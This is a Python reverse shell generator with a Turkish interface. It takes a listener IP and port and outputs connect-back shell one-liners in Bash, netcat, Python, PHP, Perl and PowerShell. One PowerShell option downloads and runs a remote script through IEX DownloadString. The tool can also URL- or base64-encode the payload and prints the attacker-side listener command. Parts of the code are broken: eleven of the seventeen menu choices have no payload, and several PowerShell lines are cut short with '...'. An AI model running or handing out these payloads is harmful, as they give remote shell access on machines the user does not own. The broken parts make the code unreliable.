#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import os
import base64
import random
import string
from urllib.parse import quote

def print_banner():
    banner = """
    ╔══════════════════════════════════════╗
    ║           SHELL GENERATOR            ║
    ╚══════════════════════════════════════╝
    """
    print(banner)

def get_input():
    print("\nShell türleri:")
    print("1. Bash")
    print("2. PowerShell (Windows)")
    print("3. Netcat (nc)")
    print("4. Python")
    print("5. PHP")
    print("6. Socat")
    print("7. Ruby")
    print("8. Perl")
    print("9. Golang")
    print("10. AWK")
    print("11. Telnet")
    print("12. Java")
    print("13. Lua")
    print("14. Node.js")
    print("15. OpenSSL")
    print("16. Dart")
    print("17. Groovy")

    try:
        choice = int(input("\nShell türü seç (1-17): "))
        if choice < 1 or choice > 17:
            print("Geçersiz seçim!")
            sys.exit(1)
    except ValueError:
        print("Lütfen geçerli bir sayı gir!")
        sys.exit(1)

    ip = input("Listener IP: ")
    port = input("Listener port: ")

    payload_options = {}
    if choice == 1:
        print("\nBash payload seçenekleri: 1-Standart 2-/dev/tcp 3-UDP 4-mkfifo")
        payload_options['bash'] = input("Seçim (1-4, varsayılan 1): ") or "1"

    elif choice == 2:
        print("\nPowerShell payload seçenekleri: 1-Standart 2-One-liner 3-Base64 4-DownloadString")
        payload_options['ps'] = input("Seçim (1-4, varsayılan 1): ") or "1"

    elif choice == 3:
        print("\nNetcat payload seçenekleri: 1-nc -e 2-mkfifo 3-no -e 4-busybox")
        payload_options['nc'] = input("Seçim (1-4, varsayılan 1): ") or "1"

    elif choice == 4:
        print("\nPython payload seçenekleri: 1-socket+subprocess 2-pty.spawn 3-subprocess only 4-Windows")
        payload_options['python'] = input("Seçim (1-4, varsayılan 1): ") or "1"

    elif choice == 5:
        print("\nPHP payload seçenekleri: 1-exec 2-shell_exec 3-system 4-passthru")
        payload_options['php'] = input("Seçim (1-4, varsayılan 1): ") or "1"

    elif choice == 8:
        print("\nPerl payload seçenekleri: 1-Socket 2-IO::Socket 3-Windows")
        payload_options['perl'] = input("Seçim (1-3, varsayılan 1): ") or "1"

    return choice, ip, port, payload_options

def generate_shell(choice, ip, port, options):
    rand_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))

    # PowerShell base64 encode düzeltmesi
    def encode_powershell(cmd):
        return base64.b64encode(cmd.encode("utf-16le")).decode()

    shells = {
        1: [
            f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            f"0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196",
            f"sh -i >& /dev/udp/{ip}/{port} 0>&1",
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
        ],
        2: [
            f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream(); ... $client.Close()\"",
            f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream(); ... $c.Close()\"",
            f"powershell -e {encode_powershell(f'$client = New-Object System.Net.Sockets.TCPClient(\\'{ip}\\',{port});$stream = $client.GetStream(); ... $client.Close()')}",
            f"powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}"
        ],
        3: [
            f"nc -e /bin/sh {ip} {port}",
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
            f"nc {ip} {port} | /bin/sh | nc {ip} {port}",
            f"busybox nc {ip} {port} -e /bin/sh"
        ],
        4: [
            f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'",
            f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
            f"python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"{ip}\",{port}));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'",
            f"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"cmd.exe\",\"/k\"])'"
        ],
        5: [
            f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ],
        8: [
            f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
        ]
    }

    if choice in options:
        option_key = list(options.keys())[0]
        option_index = int(options[option_key]) - 1
        return shells[choice][option_index]
    else:
        return shells[choice][0]

def print_listener_command(port, ip, shell_type):
    print(f"\nDinleyici komutu (kendi makinende çalıştır):")
    if shell_type == 15:
        print(f"openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes")
        print(f"openssl s_server -quiet -key key.pem -cert cert.pem -port {port}")
    else:
        print(f"nc -nvlp {port}")

def main():
    print_banner()
    choice, ip, port, options = get_input()
    shell_code = generate_shell(choice, ip, port, options)

    print(f"\nOluşturulan reverse shell kodu:\n{shell_code}\n")

    if input("URL encode yapılsın mı? (y/N): ").lower() == 'y':
        print(f"\nURL Encoded:\n{quote(shell_code)}\n")

    if input("Base64 encode yapılsın mı? (y/N): ").lower() == 'y':
        print(f"\nBase64 Encoded:\n{base64.b64encode(shell_code.encode()).decode()}\n")

    print_listener_command(port, ip, choice)

    if input("Dosyaya kaydedilsin mi? (y/N): ").lower() == 'y':
        with open("shell.txt", "w") as f:
            f.write(shell_code)
        print("shell.txt dosyasına kaydedildi")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nİşlem iptal edildi")
        sys.exit(1)
